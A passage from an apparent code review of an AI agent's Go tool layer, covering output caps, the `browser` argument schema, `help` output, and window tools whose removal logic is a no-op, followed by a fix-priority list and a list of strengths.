context compaction (which triggers at 90% saturation) — a few fat tool results
can push an otherwise-healthy conversation into summarization.

**Wish:** a per-tool output cap with a clear truncation notice, in the same spirit
as `read`'s trailer. Silent context exhaustion is a much worse failure mode than
a message saying "output truncated, re-run with a filter".

---

## 11. `browser`'s `args` is one opaque string — LOW

`browser` is better schema'd than I first assumed — it has a real `action`
property and a `Required` list:

```go
// tools/tools.go:1428
Required: []string{"action"},
Properties: map[string]models.ToolArgProps{
    "action": {Type: "string", Description: "Browser action: start, stop, ..."},
    "args":   {Type: "string", Description: "Arguments for the action (e.g., URL for go, selector for click, etc.)"},
},
```

So `action` is properly typed. The weak part is `args`, which is a single
free-text string that gets split at runtime by `strings.Fields` (see #1). For
`go` the arg is a URL, which survives whitespace splitting fine. For `fill` and
`click` it is positional, so it is exactly the case where the opaque string
hurts — the model cannot express a multi-word value.

`help` has the same shape: a single optional `command` string, split with
`strings.Fields` at `tools.go:952`.

**Wish:** split `args` into typed per-action properties (`selector`, `text`,
`url`, `path`) so the multi-word cases are expressible, rather than relying on a
quoting convention the description doesn't state.

---

## 12. `help` output is a string, not a resource — LOW

`getHelp()` returns formatted help text as a plain string, which lands in the
conversation and burns context. With `help` now able to list the live tool set
(see #5), it becomes a genuinely useful self-description primitive — a few lines
that let an agent bootstrap from cold.

Worth keeping small and structured so it can be called once at session start
without much cost.

---

## 13. Window tools are advertised but never registered as tools — MEDIUM

`checkWindowTools()` gates window support on `xdotool` + `maim`, and the removal
path is thorough:

```go
// tools/tools.go:1221
func removeWindowToolsFromBaseTools() {
    windowToolNames := map[string]bool{
        "list_windows": true, "capture_window": true, "capture_window_and_view": true,
    }
    // ...filters BaseTools, and:
    delete(FnMap, "list_windows")
    delete(FnMap, "capture_window")
    delete(FnMap, "capture_window_and_view")
}
```

But the thing it removes was never added. Searching the whole repo, those three
names appear **only** inside that removal function — they are never keys in the
`FnMap` literal (which ends at `bash`, `browser`, `summarize_chat`,
`create_issue`) and never entries in `BaseTools`.

The functionality itself does work, but only through the `bash` subcommand router:

```go
// tools/tools.go:432
case "window", "windows":            return listWindows(args)
case "capture", "screenshot":        return captureWindow(args)
case "capture_and_view", "screenshot_and_view": return captureWindowAndView(args)
```

So the actual situation is:

- the tool names are `window` / `capture` / `capture_and_view` (bash subcommands),
- the removal code is written against `list_windows` / `capture_window` /
  `capture_window_and_view` (tool names that don't exist),
- therefore `removeWindowToolsFromBaseTools()` is a **no-op**, and the availability
  check it depends on (`WindowToolsAvailable`, properly computed from `exec.LookPath`)
  never actually gates anything.

Net effect: on a machine without `xdotool`/`maim`, the subcommands are still
advertised by `help` and still routed, and they fail at call time rather than being
absent. The graceful degradation described in the feature map doesn't happen for
these.

This is exactly the class of bug the `AvailableTools()` accessor in #5 would have
caught, plus a test asserting the removal path removes something real.

**Wish:** either register them as real tools with matching names (and then the
existing removal logic starts working), or delete the dead removal function and
gate the subcommands on `WindowToolsAvailable` at the router. Right now the code
reads as if window tools are properly self-disabling, and they aren't.

---

## What I'd prioritise

If I had to rank by "how much this hurts a real session":

1. **#3** (empty write) — the one that can destroy work, and the smallest fix
2. **#2** (error convention) — the one that silently corrupts mission failure tracking
3. **#1** (browser quoting) — the one that makes a documented action impossible
4. **#4** (danger guard in mission mode) — deliberate, but the blast radius deserves
   an explicit decision rather than an inherited `if !IsMissionMode()`
5. **#5** (tool introspection) — the one that costs the most over a long session

#1 and #3 are each a couple of lines. #2 is a signature change across every handler.
#4 needs a product decision before any code. #5 is slightly more structural but would
pay for itself quickly.

---

## Non-complaints

Things that are working well, so they don't get "fixed":

- **`edit`'s unique-match requirement.** Rejecting ambiguous matches instead of
  guessing is the right call and I rely on it.
- **`resolvePath` root-escape checks** (`tools/fs.go:56`). Clean, applied
  consistently, and `FSAllowOutOfRoot` is an explicit opt-in rather than a default.
- **Tool self-disabling.** Playwright correctly removes the `browser` tool when
  disabled (`removeBrowserTools()` does filter both `BaseTools` and `FnMap`, and
  `browser` genuinely is in the `FnMap` literal). Memory is likewise added only
  when `MemoryEnabled`. Good pattern — the window tools just haven't been wired
  into it yet (#13).
- **`read`'s continuation trailer.** Small thing, but it saves a round-trip.
- **Native function calling.** Keeping the loop in-process rather than shelling
  out to an external harness is the right architecture, and the two tool-call
  dialects (OpenAI `tool_calls` vs llama.cpp `__tool_call__`) are handled
  separately rather than tangled together.
